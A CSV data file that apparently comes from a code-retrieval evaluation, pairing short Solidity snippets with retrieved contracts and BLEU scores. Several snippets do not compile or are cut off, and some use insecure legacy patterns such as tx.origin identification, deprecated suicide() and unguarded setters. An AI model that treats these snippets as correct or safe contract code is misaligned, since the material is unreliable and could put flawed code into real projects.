sni,bleu,code
"contract BasicCounter {
    uint private counter = 0;
    function incrementAndGet() external returns (uint) {
        counter++;
        return counter;
    }
}",0.6123695090613528,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Example {
    
    mapping (uint => string) public _registry;
    uint nIndex= 0; 
    function set_s(string new_s) {
        _registry[nIndex] = new_s;
        nIndex = nIndex + 1;
    }
    function get_s(uint number) returns (string) {
        return _registry[number];
    } 
}",0.6342899360952451,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract Second {
  First f;
  function Second() public {
    f = new First(); 
  }

  function checkSender(uint t) public view returns(address){
    t = 0; 
    return f.cSender();
  }
}",0.6585053007386006,"contract ICDComicsClue {

    function clues(uint id) public view returns (uint, uint);

    function ownerOf(uint256 _tokenId) public view returns (address);

}"
"contract Test {

    bytes32 public input;
    function test(bytes32 _in) public {
    input = _in;
  }
}",0.6939800818732631,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract WordContract {
string word = ""test"";
function getWord() constant returns(string) {
    return word;
}
function setWord(string newWord) returns(string) {
 word = newWord;
 return word;
}
}",0.6522463263519173,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) {
        wellcomeString = newData;
    }
    
}"
"contract MyContract {
    uint public value;
    function func1(uint x) external {
        for (uint i = 0; i < x; i++)
            value += i;
    }
    function func2(uint x) external {
        for (uint i = 0; i <= x; i++)
            value += i;
    }
}",0.6285142749544326,"contract IFlip {
    function tick(uint id) external;
    function tend(uint id, uint lot, uint bid) external;
    function dent(uint id, uint lot, uint bid) external;
    function deal(uint id) external;
}"
"contract SellToken {
  TokenInstance instance;
  function SellToken(address _address) {
    instance = TokenInstance(_address);
  }

  function () payable { 
    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    instance.mint(beneficiary, tokens);
  }

}",0.6194621998709672,"contract SelfDestroy is Ownable {

    using SafeMath for uint256;

    uint256 public weiAmount = 0;

    constructor() public {}

   

   

    function () public payable {

        weiAmount = weiAmount + msg.value;

    }

   

   function destroy(address _address) public onlyOwner {

       selfdestruct(_address);

   }



}"
"contract VehRegistry {
    address public owner;

    event Event(string vin, string mileage, string date);

    function VehRegistry() public {
        owner = msg.sender;
    }

    function registerEvent(string vin, string mileage, string date) public {
        require(msg.sender == owner);
        emit Event(vin, mileage, date);
    }

}",0.6032164980422904,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract A {
    address public addr;
    bool public success;
    bytes public result;

function setAddr(address _addr) public {
    addr = _addr;
}


function callB(uint256 arg1, uint256 arg2) public {
    (success, result) = addr.staticcall(abi.encodeWithSignature(""funcB(uint256, uint256)"", arg1, arg2));
}

}",0.6514179127225167,"contract ERC20StandardToken {



  string public name;

  string public symbol;

  uint8 public decimals;



  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



}"
"contract Math {

    function Math() public {}

    function percent(uint a, uint b) public constant returns(uint, uint) {
      uint c = a*b;
      uint integer = c/100;
      uint fractional = c%100;
      return (integer, fractional);
    }

  }",0.6863853382460289,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract Test {
    function add(uint x, uint y) constant returns (uint) {
      return x + y;
    }
  }",0.6880330404958308,"contract TestFiatContract
{
    function USD(uint) constant returns (uint256)
    {
        return 12305041990000;
    }
}"
"contract Broken {

    address creator;
    uint public aInt;
    bool[3] bools;

    function Broken(uint _aInt, bool[3] _bools) public {
        creator = msg.sender;
        aInt = _aInt;
        bools = _bools;
    }

    function getBools() constant returns (bool[3]) {
        return bools;
    }

    function kill() {
        if (msg.sender == creator) suicide(creator);
    }

}",0.6167323310772437,"contract BaseAgriChainContract {
    address creator; 
    function BaseAgriChainContract() public    {   creator = msg.sender;   }
    
    modifier onlyBy(address _account)
    {
        if (msg.sender != _account)
            throw;
        _;
    }
    
    function kill() onlyBy(creator)
    {               suicide(creator);     }
     
     function setCreator(address _creator)  onlyBy(creator)
    {           creator = _creator;     }
  
}"
"contract C {
    uint someVariable;
    uint[] data;

    function f() public {
        uint[] x;
        x.push(2);
        data = x;
    }
}",0.6045598129874361,"contract iRNG {

    function update(uint roundNumber, uint additionalNonce, uint period) public payable;

}"
"contract helloworld { 
     uint public balance;
    function helloworld(){
        balance = 1000;
    }

    function getBalance()  returns(uint) {
        return balance; 
    } 
}",0.6604973352617294,"contract Token {
    function balanceOf(address) public constant returns (uint);
    function transfer(address, uint) public returns (bool);
}"
"contract Parent {
    address owner;

    event NewChildCreated(address childAddress, address creator);

    function Parent() public {
        owner = msg.sender;
    }

    function createChild() public {
        Child child = new Child();
        NewChildCreated(address(child), child.owner());
    }
}",0.6445946523602896,"contract Owned {
	modifier only_owner { require (msg.sender == owner); _; }

	event NewOwner(address indexed old, address indexed current);

	function setOwner(address _new) public only_owner { NewOwner(owner, _new); owner = _new; }

	address public owner;
}"
"contract NewContract {

    Mytoken token;

    uint256 public rate;

    function NewContract(uint256 _rate){
        rate = _rate;
    }

    function () payable {
        token.mint(msg.sender, msg.value);
    }
}",0.6248522675924637,"contract token {



    function balanceOf(address _owner) public constant returns (uint256 balance);

    

    

    function transfer(address _to, uint256 _value) public;



}"
"contract MyContract {
    uint256[] public array;
    function justPush(uint256 value) external {
        array.push(value);
    }
}",0.645382412236372,"contract Example {

    uint256 public value;

    function setValue(uint256 _value) public {

        value = _value;

    }

}"
"contract Foo {
    Bar public bar;

    function Foo(){
        bar = new Bar();
    }

    function test() returns (uint) { return 1; }

    function test2() {}

    function execute() {
        bar.run();
    }
}",0.6499283399552805,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract Account {
  mapping (address => uint256) public balanceOf;

  function deposit() public payable {
    balanceOf[msg.sender] += msg.value;
  }

  function withdraw() public {
    uint256 amount = balanceOf[msg.sender];
    balanceOf[msg.sender] = 0;
    msg.sender.transfer(amount);
  }
}",0.6850506598204602,"contract Withdrawable {
    mapping (address => uint) public pendingWithdrawals;

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        
        require(amount > 0);
        require(this.balance >= amount);

        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}"
"contract GuessTheNumberChallenge {
    constructor() public payable {
        require(msg.value == 1 ether);
    }
    function () external payable {}

}",0.6247418293104211,"contract HermesPayoutAllKiller {

    function pay(address hermes) public payable {

        require(hermes.call.value(msg.value)(), ""Error"");

    }

}"
"contract A is B {
    function bbb() public {  }
    function test() public {
       bbb(); 
       super.test(); 
    }
}",0.6674457739148907,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract adderr {
    int total;
    function adder() public {
        total = 0;
    }
    function getTotal() constant returns (int){
        return total;
    }
   function addToTotal(int add) returns (int) {
       total = total + add;
       return total;
   }
   function calculateProof(string document) constant returns (bytes32) {
       return sha256(document);
   }",0.6469695531072734,"contract myTime is mortal
{
    uint deployTime;

    
    function myTime() public
    {
        deployTime = block.timestamp;
    }

    function getDeployTime() constant returns (uint)
    {
        return deployTime;
    }

    function getBlockTime() constant returns (uint)
    {
        return block.timestamp;
    }

    function getNowTime() constant returns (uint)
    {
        return now;
    }
}"
"contract Proxy is Owned {
event Forwarded (
    address indexed destination,
    uint value,
    bytes data
);

function () payable{}

function forward(address destination, uint value, bytes data) onlyOwner {
    if (!destination.call.value(value)(data)) {
        throw;
    }
    Forwarded(destination, value, data);
}}",0.6561247166688017,"contract ERC223Basic is StandardToken{
    uint public totalSupply;
    
    function transfer(address to, uint value);
    function transfer(address to, uint value, bytes data);
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract StarNotary is ERC721 {
    struct Star {
        string name;
    }

    mapping(uint256 => Star) public tokenIdToStarInfo;
    mapping(uint256 => uint256) public starsForSale;

    
    function createStar(string memory _name, uint256 _tokenId) public {
        Star memory newStar = Star(_name);
        tokenIdToStarInfo[_tokenId] = newStar;
        _mint(msg.sender, _tokenId);
    }

    
    function putStarUpForSale(uint256 _tokenId, uint256 _price) public {
        require(
            ownerOf(_tokenId) == msg.sender,
            ""You can't sale the Star you don't owned""
        );
        starsForSale[_tokenId] = _price;
    }

    function _make_payable(address x) internal pure returns (address payable) {
        return address(uint160(x));
    }

    function buyStar(uint256 _tokenId) public payable {
        require(starsForSale[_tokenId] > 0, ""The Star should be up for sale"");
        uint256 starCost = starsForSale[_tokenId];
        address ownerAddress = ownerOf(_tokenId);
        require(msg.value > starCost, ""You need to have enough Ether"");
        transferFrom(ownerAddress, msg.sender, _tokenId);
        address payable ownerAddressPayable = _make_payable(ownerAddress);
        ownerAddressPayable.transfer(starCost);
        if (msg.value > starCost) {
            msg.sender.transfer(msg.value - starCost);
        }
    }
}",0.6383539792686852,"contract DistributeByTransferFrom is Ownable {

  address public owner;



  constructor () public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }

  event Pay(uint256 _value, bytes _id);

  

  

  function () payable public {

    owner.transfer(msg.value);

    emit Pay(msg.value, msg.data);

  }

  

  function distributeTokens(address _token, address _from, uint256[] _bits) public onlyOwner returns (bool result) {

    require(_bits.length % 2 == 0);

    for (uint256 i = 0; i < _bits.length; i+=2) {

      address to = address(_bits[i]);

      uint256 value = _bits[i+1];

      ERC20StdToken(_token).transferFrom(_from, to, value);

    }

    return true;

  }

  

  function withdrawEther() public onlyOwner returns(bool res) {

    uint256 ethBalance = address(this).balance;

    owner.transfer(ethBalance);

    return true;

  }

  

  function withdrawERC20(address _token) public onlyOwner returns(bool res) {

    uint256 value = ERC20StdToken(_token).balanceOf(address(this));

    ERC20StdToken(_token).transfer(owner, value);

    return true;

  }

  

  function withdrawERC721(address _contract, uint256 _tokenId) public onlyOwner returns(bool res) {

    ERC721StdToken(_contract).safeTransferFrom(address(this), owner, _tokenId);

    return true;

  }

}"
"contract CampaignFact {
    address[] public deployedCampaigns;

function createCampaign(uint min) public {
    address newC = new Campaign(min, msg.sender);
    deployedCampaigns.push(newC);
}

function getDeployedCampaigns() public view returns (address[] memory) {
    return deployedCampaigns;
  }
}",0.6910219206754568,"contract CreateBlogger {

    address [] public deployedBlogs;



    function createBlogger() public returns(address) {

        address newBlogger = new Blogger(msg.sender);

        deployedBlogs.push(newBlogger);

        return newBlogger;

    }



    function getDeployedBlogs() public view returns(address[]) {

        return deployedBlogs;

    }

}"
"contract Campaign {

struct Request {
    string description;
    uint value;
    address recipient;
    bool complete;
    uint approvalCount;
    mapping (address => bool) approvals;
}

Request[] public requests;
address public manager;
uint public minimumContribution;
mapping (address => bool) public approvers;
uint public approversCount;

modifier restrict() {
    require(msg.sender == manager);
    _;
}

constructor(uint min, address creator) public {
    manager = creator;
    minimumContribution = min;
}

function contribute() public payable {
    require(msg.value > minimumContribution, ""Error: You do not have enough money. You are poor."");
    approvers[msg.sender] = true;
    approversCount++;
}

function createRequest(string memory desc, uint val, address rec) public restrict {
    
    require(approvers[msg.sender]);

    Request memory newReq = Request({
        description: desc,
        value: val,
        recipient: rec,
        complete: false,
        approvalCount: 0
    });

    requests.push(newReq);
}

function approveRequest(uint index) public {
    Request storage r = requests[index];

    
    require(approvers[msg.sender]);

    
    require(!r.approvals[msg.sender]);

    r.approvals[msg.sender] = true;
    r.approvalCount++;
}

function finalizeRequest(uint index) public restrict {

    Request storage r = requests[index];

    require(r.approvalCount > (approversCount / 2) );
    require(!r.complete);       

    r.recipient.transfer(r.value);
    r.complete = true;
  }
}",0.6145026544151434,"contract ZigZagToken {

    

    string public name = ""The ZigZag Token"";

    string public symbol = ""TZZT"";

    uint8 public decimals = 0;

    

    uint256 public totalSupply;

    uint256 public ZigZagSupply = 5000000;

    uint256 public price ;

    address public creator;

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event FundTransfer(address backer, uint amount, bool isContribution);

    

    

    

    function ZigZagToken() public {

        totalSupply = ZigZagSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;    

        creator = msg.sender;

    }

    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

      

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    function () payable internal {

        

        if (price >= 0 ether && price < 0.05 ether){

        uint amount = 1000;                  

        uint amountRaised;                                     

        amountRaised += msg.value;                            

        require(balanceOf[creator] >= 4700000);               

        require(msg.value < 0.1 ether);                        

        balanceOf[msg.sender] += amount;                  

        balanceOf[creator] -= amount;                        

        Transfer(creator, msg.sender, amount);               

        creator.transfer(amountRaised);

        }

      

    }



 }"
"contract MyContract {
    struct MyStruct {
        address a;
        uint b;
    }

    MyStruct[] public MyStructs;

    function getStruct(uint index) public constant returns (address, uint) {
        return (MyStructs[index].a, MyStructs[index].b);
    }

    function addStruct(address _a, uint _b) public returns (uint){
        MyStruct memory a = MyStruct(_a, _b);
        MyStructs.length++;
        MyStructs.push(a);
        return MyStructs.length;
    }
}",0.6007889261516538,"contract Token {
    function balanceOf(address _owner) constant public returns (uint balance);
    function allowance(address _user, address _spender) constant public returns (uint amount);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract MyContractOwnerAddr {
        uint256 public peopleCount = 0;
        mapping(uint => Person) public people;

        address owner;

        modifier onlyOwner() {
            require(msg.sender == owner);
            _;
        }

        struct Person {
            uint _id;
            string _firstName;
            string _lastName;
        }

        constructor() public {
            owner = msg.sender;
        }

        function addPerson(
            string memory _firstName,
            string memory _lastName)
            public
            onlyOwner
        {
            incrementCount();
            people[peopleCount] = Person(peopleCount, _firstName, _lastName);
        }

        function incrementCount() internal {
            peopleCount += 1;
        }
    }",0.6291527261040615,"contract WishingWell {



    event wishMade(address indexed wisher, string wish, uint256 amount);

    

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(

            msg.sender == owner,

            ""Only owner can call this function.""

        );

        _;

    }



    function changeOwner(address new_owner) public onlyOwner {

        owner = new_owner;

    }

    

    function makeWish(string wish) public payable {

        emit wishMade(msg.sender, wish, msg.value);

    }

    

    function withdrawAll() public onlyOwner {

        address(owner).transfer(address(this).balance);

    }

    

}"
"contract C {
    uint256 hexVal = 0xABCD;

    function func(address[] addrs) {
        
    }
}",0.6863863977003316,"contract Dragon {
    function transfer( address _to, uint256 _amount );
}"
"contract coinCaller{

    function sendCoin(address coinContractAddress, address receiver, uint amount) public returns (address) {
        metaCoin m = metaCoin(coinContractAddress);
        var (status, addr) = m.sendToken(receiver, amount);
        return addr;
    }
}",0.6389075608428354,"contract OzrealTest is Notify
{
    address public ozr;
    
    function setOzr(address _addr) { ozr = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == ozr);
        Notified(_from, _amount);
        return true;
    }
}"
"contract Transfer {
    function Transfer () {
        owner = msg.sender;
    }
    function sendEther (address dst) payable {
        if(msg.value<=0) revert();
        dst.transfer(msg.value);
    }
}",0.6444896315950548,"contract mortal {
    address private owner;
    
    function mortal() { owner = msg.sender; }
    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}"
"contract Receive {
    uint256 public balance;
    function pay() public payable {

    }
}",0.6645214634561336,"contract Buyable {
  function buy (address receiver) public payable;
}"
"contract Contract {

  function deposit(bytes32 _id) payable {
     LogJob(msg.sender);
  }
  event LogJob(address indexed _from);
}",0.6134157661063705,"contract ControllerEventDefinitions {
    
    event ControllerBurn(address indexed from, bytes32 indexed to, uint value);
}"
"contract ApprovalContract {

  address payable public sender;
  address payable public receiver;
  address constant public approver = 0xd268143B6FBD9BC6533F778052710C962eaAa68C;


  function deposit(address payable _receiver) external payable {
    require(msg.value > 0);
    sender = msg.sender;
    receiver = _receiver;
  }

    function viewApprover() external pure returns(address) {
    return(approver);
  }

   function approve() external {
    require(msg.sender == approver);
    receiver.transfer(address(this).balance);
  }

}",0.6429404912054165,"contract Cryptoman is Mortal{

    
    function deposit() public payable {
    }

    
    function withdraw(uint amount, address payable receiver) public onlyOwner {
      require(address(this).balance >= amount, ""insufficient balance"");
      receiver.transfer(amount);
    }
    
    
    function withdrawTokens(address tokenAddress, uint amount, address payable receiver) public payable onlyOwner {
      ERC20 token = ERC20(tokenAddress);
      require(token.balanceOf(address(this))>=amount,""insufficient funds"");
      token.transfer(receiver, amount);
    }


}"
"contract B {

  function funcB(uint256 arg1) public pure returns(bool) {
    if (arg1 > 10) {
        return true;
    } else {
        return false;
    }
  }
}",0.6473313822510119,"contract Agent {

    using SafeMath for uint256;



    function isInitialized() public view returns (bool) {

        return false;

    }

}"
"contract Factory {
  
  function newChild() returns (address) {
    Child c = new Child();
    return c;
  }
  
}",0.6255214615703719,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract MyToken {
  uint256 a;

  function SimpleGetter() returns(string) {
    return ""something"";
  }

  function DoTheGreat(address _to) returns(uint256) payable {
       
       return ;
  }
}",0.6560242108123325,"contract MortgageToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}"
"contract splitfund {

address admin;

constructor() public {

    admin = msg.sender;
}


function splitFunds(address[] withdrawaddress, uint[] proration) public payable {

    for(uint i = 0; i<withdrawaddress.length; i++) {
    withdrawaddress[i].transfer(proration[i] * msg.value/100);
    }
  }
}",0.6169291754855017,"contract BalanceChecker {
  address public owner;
 

  constructor() public {
    owner = msg.sender;
  }

  function check(address[] memory addresses) public view returns (bool){
    
 
    for(uint i=0; i<addresses.length;i++){
      if(addresses[i].balance != 0){
          return true;
      }
    }
    return false;
    
  }
}"
"contract BoostrFactory {
            address[] private deployedBoostrs;

            function createBoostr(uint minimum) public {
                    address newBoostr = new Boostr(minimum, msg.sender);
                    deployedBoostrs.push(newBoostr);
            }

            function getAllBoostrs() public view returns (address[]) {
                    return deployedBoostrs;
            }
    }",0.6183233452314607,"contract DeployerI {



    mapping(address => uint) public deployedContractPointers;

    address[] public deployedContracts;



    function getDeployedContractsCount() public view returns(uint count);

    function isDeployedContract(address deployed) public view returns(bool isIndeed);



}"
"contract Boostr {
            struct Request {
                    string description;
                    uint value;
                    address recipient;
                    bool complete;
                    mapping(address=>bool) approval;
                    uint approvalCount;
            }

            Request[] public requests;
            address private manager;
            uint public minimumContribution;
            mapping(address=>bool) private supporters;
            mapping(address=>bool) private approvers;
            uint public approversCount;

            modifier managerRestricted() {
                    require(msg.sender == manager);
                    _;
            }

            modifier approverRestricted() {
                    require(approvers[msg.sender]);
                    _;
            }

            constructor(uint minimum, address creator) public {
                    manager = creator;
                    minimumContribution = minimum;
            }

            function getManager() public view returns (address) {
                    return manager;
            }

            function getApprover(address addr) public view returns (bool) {
                    return approvers[addr];
            }

            function getSupporter(address addr) public view returns (bool) {
                    return supporters[addr];
            }

            function contribute() public payable {
                    if (msg.value > 0) {
                            supporters[msg.sender] = true;
                            if (msg.value > minimumContribution) {
                                    approvers[msg.sender] = true;
                                    approversCount++;
                            }
                    }
            }

            function getSummary() public view returns (uint, uint, uint, uint, address) {
                    return (
                            minimumContribution,
                            address(this).balance,
                            requests.length,
                            approversCount,
                            getManager()
                    );
            }

            function getRequestsCount() public view returns (uint) {
                    return requests.length;
            }

            function createRequest(string description, uint value, address recipient) public managerRestricted {
                    Request memory newRequest = Request ({
                            description: description,
                            value: value,
                            recipient: recipient,
                            complete: false,
                            approvalCount: 0
                    });
                    requests.push(newRequest);
            }

            function approveRequest(uint index) public {
                    Request storage request = requests[index];
                    require (approvers[msg.sender]);
                    require (!request.approval[msg.sender]);
                    request.approval[msg.sender] = true;
                    request.approvalCount++;
            }

            function finalizeRequest(uint index) public managerRestricted payable {
                    Request storage request = requests[index];
                    require (!request.complete);
                    require (request.approvalCount > approversCount / 2);
                    request.complete = true;
                    request.recipient.transfer(request.value);
            }
    }",0.645511810335831,"contract ENC is ERC20Interface {

    uint256 public constant decimals = 5;



    string public constant symbol = ""ENC"";

    string public constant name = ""Enetrix Coin"";



    uint256 public _totalSupply = 5 ** 14; 



    

    address public owner;



    

    mapping(address => uint256) private balances;



    

    mapping(address => mapping (address => uint256)) private allowed;



    

    mapping(address => bool) private approvedInvestorList;



    

    mapping(address => uint256) private deposit;





    

    uint256 public totalTokenSold = 0;





    

    modifier onlyPayloadSize(uint size) {

      if(msg.data.length < size + 4) {

        revert();

      }

      _;

    }







    

    function ENC()

        public {

        owner = msg.sender;

        balances[owner] = _totalSupply;

    }



    

    

    function totalSupply()

        public

        constant

        returns (uint256) {

        return _totalSupply;

    }











    

    

    

    function balanceOf(address _addr)

        public

        constant

        returns (uint256) {

        return balances[_addr];

    }



    

    

    function isApprovedInvestor(address _addr)

        public

        constant

        returns (bool) {

        return approvedInvestorList[_addr];

    }



    

    

    

    function getDeposit(address _addr)

        public

        constant

        returns(uint256){

        return deposit[_addr];

}





    

    

    

    

    function transfer(address _to, uint256 _amount)

        public



        returns (bool) {

        

        

        

        if ( (balances[msg.sender] >= _amount) &&

             (_amount >= 0) &&

             (balances[_to] + _amount > balances[_to]) ) {



            balances[msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(msg.sender, _to, _amount);

            return true;

        } else {

            return false;

        }

    }



    

    

    

    

    

    

    function transferFrom(

        address _from,

        address _to,

        uint256 _amount

    )

    public



    returns (bool success) {

        if (balances[_from] >= _amount && _amount > 0 && allowed[_from][msg.sender] >= _amount) {

            balances[_from] -= _amount;

            allowed[_from][msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(_from, _to, _amount);

            return true;

        } else {

            return false;

        }

    }



    

    

    function approve(address _spender, uint256 _amount)

        public



        returns (bool success) {

        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));

        allowed[msg.sender][_spender] = _amount;

        Approval(msg.sender, _spender, _amount);

        return true;

    }



    

    function allowance(address _owner, address _spender)

        public

        constant

        returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }



    function () public payable{

        revert();

    }



}"
"contract Registry is Ownable {
  address core;

  function setCore(address _core) external onlyOwner {
    core = _core;
  }

  function getCore() public view returns (address) {
    return core;
  }
}",0.6653802859144088,"contract ERC20 {

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

}"
"contract ShouldNotCompile {
    address addr;
    function getSender() constant returns (address) {
        addr = msg.sender;
        return addr;
    }
}",0.6981380162178963,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Proxy is IProxy {
  IERC20 public BT;
  IERC20 public QT;
  address public option;
  address public buyer;
  uint256 public dealExpiry;
  uint256 public price;
   function Proxy(address _baseToken, address _quoteToken, uint256 _expiry, uint256 _strikePrice, address _buyer) public {
      BT = IERC20(_baseToken);
      QT = IERC20(_quoteToken);
      dealExpiry = _expiry;
      price = _price;
      buyer = _buyer;
 }

   function distributeStakes(address _to, uint256 _amount) public returns (bool success) {
        require(QT.transfer(to, amount)); 
        require(BT.transferFrom(_to, buyer, _amount));
     }
     return true;
 }",0.6669519747165391,"contract Token {
	function SetupToken(string tokenName, string tokenSymbol, uint256 tokenSupply) public;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
}"
"contract example {
    mapping (uint => string) map;

    function example () {
        map[123] = ""123"";
    }

    function return1 () returns (string) {
        return map[123];
    }

    function return2 () returns (string) {
        return map[1];
    } 
}",0.6345920021638323,"contract PausedEURON is PausedToken {

    function name() public pure returns (string memory) {

        return ""EURON"";

    }



    function symbol() public pure returns (string memory) {

        return ""ERN"";

    }

}"
"contract DoesAddressExist {
        using SafeMath for uint256;


constructor() public {
}


function () private payable {}



struct ValueRecorded {
    uint valueEntered;
    uint8 flag;
}

ValueRecorded[] public valueRecorded;

mapping(address => ValueRecorded) user;




function storeValue(uint _value) public {
        ValueRecorded memory newValueRecorded = ValueRecorded ({
                valueEntered: _value,
                flag: 1
                });
        valueRecorded.push(newValueRecorded);

}


function checkForAddress(address _address) public view returns (bool) {
    if(user[_address].flag == 1) {
    return true; }
    else return false;
    }


}",0.6137855897828238,"contract Verification {
	using SafeMath for uint256;
    mapping(address => uint256) veruser;
	function RA(address _to) public view returns(bool){
		if(veruser[_to]>0){
			return true;
		}else{
			return false;
		}
	}
	function VerificationAccountOnJullar() public {
	    if(RA(msg.sender) == false){
		    veruser[msg.sender] = veruser[msg.sender].add(1);	
		}
	}
	
	string public TestText = ""Gaziali"";
	
	function RT() public view returns(string){
		return TestText;
	}
	
	function CIzTezt(string _value) public{
		TestText = _value;
	}
	
	function VaN(address _to) public {
		if(RA(_to) == false){
		    veruser[_to] = veruser[_to].add(1);	
		}
	}

}"
"contract MetaCoin {

    uint256[] public someNumbers;

    function writeNumber(uint256 num) public {
      someNumbers.push(num);
    }
...
",0.6492403083492209,"contract Abonus {

    function getETH(uint256 num) public;    

    function getETHNum() public view returns (uint256);

}"
"contract Registry {
    mapping(bytes32 => address) public ID;
    mapping(address => address) public Contract;

    function register(bytes32 _id) {
        ID[_id] = tx.origin;
        Contract[tx.origin] = msg.sender;
    }

    function getPublicAddress(bytes32 _id) constant returns (address) {
        return (ID[_id]);
    }

    function getContractAddress(bytes32 _id) constant returns (address) { 
        return Contract[ID[_id]];
    } 
}",0.6798661282626638,"contract IController is Pausable {

    event SetContractInfo(bytes32 id, address contractAddress, bytes20 gitCommitHash);



    function setContractInfo(bytes32 _id, address _contractAddress, bytes20 _gitCommitHash) external;

    function updateController(bytes32 _id, address _controller) external;

    function getContract(bytes32 _id) public view returns (address);

}"
